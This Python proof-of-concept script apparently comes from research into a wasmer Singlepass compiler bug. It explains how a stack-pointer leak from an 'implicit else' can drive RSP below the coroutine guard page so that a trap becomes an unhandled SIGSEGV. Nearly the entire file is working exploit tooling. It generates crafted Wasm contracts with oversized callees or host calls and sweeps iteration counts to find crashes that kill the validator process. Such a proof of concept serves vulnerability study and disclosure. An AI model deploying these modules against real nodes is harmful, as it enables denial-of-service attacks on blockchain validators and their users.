#!/usr/bin/env python3
"""
Can the Singlepass "implicit else" leak escalate a clean Wasm trap into an
*unrecoverable* fault (SIGSEGV that kills the validator process)?

Geometry (corosensei 0.3.4, stack/unix.rs)
--------------------------------------------
    mmap(len = size + 2 pages)            PROT_NONE
    mprotect(mmap + page, size)           READ|WRITE   <- usable stack
    base  = mmap + len                    (top)
    limit = mmap                          (bottom of the guard page)

So the usable stack is `size` bytes, the 4 KiB guard page sits *below* it and
`stack_ptr_in_bounds(p) == p >= limit && p < base` counts the guard page as
"in bounds".

wasmer's trap handler (lib/vm/src/trap/traphandlers.rs) only recovers a trap
when the *stack pointer at the fault* is in bounds:

    if !coro_trap_handler.stack_ptr_in_bounds(sp) { return false; }   // -> SIGSEGV

The leak lowers RSP with `sub rsp, 8` (a pure register operation, no memory
access), so RSP can cross `limit` *silently*.  The first real write below the
drifted RSP then faults with SP < limit -> the signal is not handled -> the
process dies.  Whether that is reachable depends on how far below the RSP the
faulting write lands:

  * a `call` / `push` writes 8 bytes below RSP  -> SP stays >= limit -> trap
  * a callee whose frame is allocated with one big `sub rsp, N` and then
    writes below it -> SP can be far below limit -> process dies

This script builds the leaking loop followed by a call to such a callee and
sweeps the iteration count around the trap threshold, looking for a process
crash (the harness' SIGSEGV handler fires only when wasmer does *not* recover
the fault).

Usage:
    python3 crash_window.py --callee biglocals|bigvalues|host|none
"""

import argparse
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                     # noqa: E402
from upstream_regression import RESP   # noqa: E402
from wasm_builder import (              # noqa: E402
    I32, I64, Module, op_block, op_br_if, op_call, op_drop, op_end,
    op_i32_const, op_i32_eq, op_i32_sub, op_i64_const, op_if, op_local_get,
    op_local_set, op_local_tee, op_loop, op_nop, op_unreachable,
)

HOSTS = {
    "secp256k1_recover_pubkey": ([I32, I32, I32], [I64]),
    "secp256k1_verify": ([I32, I32, I32], [I32]),
    "db_read": ([I32], [I32]),
    "db_write": ([I32, I32], []),
    "addr_validate": ([I32], [I32]),
    "debug": ([I32], []),
}


def _base_module(host, params, results):
    m = Module()
    m.add_memory(2, export="memory")
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    m.add_data(4096, (4).to_bytes(4, "little") + b"\x00\x00\x00\x00")
    host_idx = m.add_import("env", host, params, results) if host else None
    t_pass = m.add_type([I64], [I64])
    return m, host_idx, t_pass


def _add_callee(m, kind, host_idx, params, results, nlocals):
    """Returns the index of the callee to call after the leaking loop."""
    if kind == "none":
        return None
    if kind == "host":
        return host_idx
    if kind == "biglocals":
        # a function with a huge *locals* area: one big `sub rsp, N` in the
        # prologue, then a store into the deepest local.
        body = bytearray()
        body += op_i64_const(7)
        body += op_local_set(nlocals - 1)          # write the deepest local
        body += op_local_get(nlocals - 1)
        return m.add_func([], [I64], locals=[I64] * nlocals, body=bytes(body))
    if kind == "bigvalues":
        # a function with a huge *value stack*: many simultaneously live values.
        body = bytearray()
        for _ in range(nlocals):
            body += op_i64_const(1)
        for _ in range(nlocals):
            body += op_drop()
        body += op_i64_const(3)
        return m.add_func([], [I64], body=bytes(body))
    raise ValueError(kind)


def build(iterations, prefix, kind="none", host="db_read", nlocals=4096,
          leak=True):
    params, results = HOSTS[host]
    m, host_idx, t_pass = _base_module(host if kind == "host" else None,
                                       params, results)
    callee = _add_callee(m, kind, host_idx, params, results, nlocals)

    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(3)
    b += op_loop()
    for _ in range(prefix + 1):
        b += op_local_get(0)
    b += op_local_get(1)
    if leak:
        b += op_if(t_pass)
        b += op_end()
        b += op_drop()
    for _ in range(prefix):
        b += op_drop()
    if callee is not None:
        if kind == "host":
            for _ in params:
                b += op_i32_const(4096)
        b += op_call(callee)
        if kind == "host":
            for _ in results:
                b += op_drop()
        else:
            b += op_drop()
    b += op_local_get(3) + op_i32_const(1) + op_i32_sub()
    b += op_local_tee(3) + op_br_if(0)
    b += op_end()
    b += op_i32_const(1)
    check = m.add_func([I64, I32, I64], [I32], locals=[I32], body=bytes(b))

    ex = bytearray()
    ex += op_block()
    ex += op_i64_const(123) + op_i32_const(0) + op_i64_const(123)
    ex += op_call(check)
    ex += op_i32_const(1) + op_i32_eq() + op_br_if(0)
    ex += op_unreachable()
    ex += op_end()
    ex += op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], body=bytes(ex), export="execute")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def classify(r):
    err = (r.get("execute_err") or r.get("instantiate_err") or r.get("store_err") or "")
    low = err.lower()
    if r.get("crash"):
        return "CRASH", err
    if r.get("store_err"):
        return "REJECTED", err
    if "call stack exhausted" in low:
        return "STACK-EXH", err
    if "out of bounds" in low:
        return "MEM-OOB", err
    if "unreachable" in low:
        return "VALUE-BAD", err
    if err:
        return "ERR", err
    return "ok", err


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--kind", default="biglocals",
                    choices=["biglocals", "bigvalues", "host", "none"])
    ap.add_argument("--host", default="db_read")
    ap.add_argument("--prefix", type=int, default=4)
    ap.add_argument("--nlocals", type=int, default=4096)
    ap.add_argument("--window", type=int, default=24)
    ap.add_argument("--stack", type=int, default=1 << 20)
    ap.add_argument("--no-leak", action="store_true",
                    help="use an explicit else (no leak) as the control")
    ap.add_argument("--iters", type=int, default=0)
    args = ap.parse_args()

    leak = not args.no_leak
    print("kind=%s leak=%s prefix=%d nlocals=%d stack=%d"
          % (args.kind, leak, args.prefix, args.nlocals, args.stack))

    if args.iters:
        threshold = args.iters
    else:
        lo, hi = 1, 1 << 21
        while lo < hi:
            mid = (lo + hi) // 2
            wasm = build(mid, args.prefix, args.kind, args.host, args.nlocals, leak)
            v, _ = classify(R.run_once(wasm, args.stack))
            if v in ("STACK-EXH", "MEM-OOB", "CRASH"):
                hi = mid
            else:
                lo = mid + 1
        threshold = lo
        print("trap threshold (bisected): %d iterations" % threshold)

    print("\n%-10s %-10s %s" % ("iters", "outcome", "detail"))
    crashes = []
    for k in range(0, args.window):
        n = threshold - k
        if n <= 0:
            break
        wasm = build(n, args.prefix, args.kind, args.host, args.nlocals, leak)
        r = R.run_once(wasm, args.stack)
        v, err = classify(r)
        extra = ""
        if v == "CRASH":
            extra = "  fault=%s rsp=%s rip=%s" % (
                hex(r.get("fault_addr") or 0), hex(r.get("rsp") or 0),
                hex(r.get("rip") or 0))
            crashes.append((n, r))
        print("%-10d %-10s %s%s" % (n, v, err.replace("\n", " ")[:55], extra))
        sys.stdout.flush()

    print("\n== summary")
    print("   trap threshold : %d iterations" % threshold)
    print("   crashes        : %d" % len(crashes))
    for n, r in crashes:
        print("      iters=%d fault=%s rsp=%s rip=%s"
              % (n, hex(r.get("fault_addr") or 0), hex(r.get("rsp") or 0),
                 hex(r.get("rip") or 0)))


if __name__ == "__main__":
    main()
